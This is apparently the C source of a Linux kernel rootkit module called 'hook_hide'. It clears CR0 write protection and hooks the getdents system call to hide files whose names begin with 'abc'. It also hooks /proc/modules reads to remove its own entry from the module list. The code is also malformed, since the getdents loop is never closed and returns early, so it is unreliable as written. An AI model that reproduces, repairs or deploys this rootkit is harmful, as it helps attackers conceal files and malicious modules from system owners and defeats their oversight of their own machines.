#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/moduleparam.h>
#include <linux/unistd.h>
#include <linux/semaphore.h>
#include <asm/cacheflush.h>
#include <asm/pgtable_types.h>
#include <linux/kallsyms.h>
#include <linux/sched.h>
#include <linux/string.h>
#include <linux/fs.h>
#include <asm/special_insns.h>
#include <linux/uaccess.h>

#define PREFIX "abc"
#define PREFIX_SIZE (sizeof(PREFIX) - 1)

struct dirent_{
	unsigned long	d_ino;
	unsigned long	d_off;
	unsigned short	d_reclen; // d_reclen is the way to tell the length of this entry
	char		d_name[1]; // the struct value is actually longer than this, and d_name is variable width.
};

static unsigned long **p_sys_call_table;
static struct file_operations *proc_modules_operations;

/* Aquire system calls table address */
unsigned long original_cr0;

#define MODULE_NAME "hook_hide"
MODULE_LICENSE("GPL");

asmlinkage int (*original_getdents) (unsigned int, struct dirent_  *, unsigned int);

asmlinkage int custom_getdents(unsigned int fd, struct dirent_  *entries, unsigned int count) {
	
	char check[5] = "abc";
	struct dirent_ *dEntryPtr;
	long bytes_read;

	bytes_read = original_getdents(fd, entries, count);

	if(bytes_read <= 0) {
		return 0;
	}

	char* dbuf;
	dbuf = (char*) entries;
	int boff=0;
	
	// read all loop
	for(boff = 0; boff < bytes_read;){
		dEntryPtr = (struct dirent_*) (dbuf + boff);
	
		if(strlen(dEntryPtr->d_name) >=3 && dEntryPtr->d_name[0]=='a' && dEntryPtr->d_name[1]=='b' && dEntryPtr->d_name[2] == 'c'){
			copy_to_user(dbuf + boff, dbuf + boff + dEntryPtr -> d_reclen, bytes_read - (boff + dEntryPtr -> d_reclen));
			bytes_read -= dEntryPtr->d_reclen;
		}
		else {
			boff += dEntryPtr->d_reclen;
		}
		
	return bytes_read;	
}

ssize_t (*original_proc) (struct file *, char __user *, size_t, loff_t *); 

ssize_t custom_proc(struct file *fp, char __user *buff, size_t len, loff_t *offset) {
  
  char *remove_line = NULL;
  char *remove_line_end = NULL;
  ssize_t ret = original_proc(fp, buff, len, offset);
  
  printk(KERN_ALERT "Entered with ret: %ld", ret);
  remove_line = strnstr(buff, MODULE_NAME, ret);
  printk(KERN_ALERT "Remove line %s\n", remove_line); 
  if(NULL != remove_line) {
  	remove_line_end = remove_line;
        while(remove_line_end < (buff + ret)) {
		if(*remove_line_end == '\n') {
			remove_line_end++;
			break;
		}
		remove_line_end++;
        }
	copy_to_user(remove_line, remove_line_end, buff + ret - (remove_line_end));
	ret -= buff + ret - (remove_line_end);
  }
  return ret;
}

__init int init_module() {
    printk(KERN_ALERT "Entering the init_module");

    p_sys_call_table = (void *) kallsyms_lookup_name("sys_call_table");
    proc_modules_operations = (struct file_operations *) kallsyms_lookup_name("proc_modules_operations");
     
    original_cr0 = read_cr0();
    write_cr0(original_cr0 & ~0x00010000);
    
    //Get the number from /usr/include/asm/unistd_64.h
    original_getdents = (void *)p_sys_call_table[__NR_getdents];
    printk(KERN_ALERT "Obtained original getdents\n"); 
 
    original_proc = proc_modules_operations->read;
    // we now overwrite the syscall
    p_sys_call_table[__NR_getdents] = (unsigned long *) custom_getdents;
    proc_modules_operations -> read = custom_proc;

    write_cr0(original_cr0);
  
    return 0;
}

void cleanup_module()
{

   	original_cr0 = read_cr0();
    	write_cr0(original_cr0 & ~0x00010000);

    	p_sys_call_table[__NR_getdents] = (unsigned long *)original_getdents;
	proc_modules_operations -> read = original_proc;
        write_cr0(original_cr0);	

}
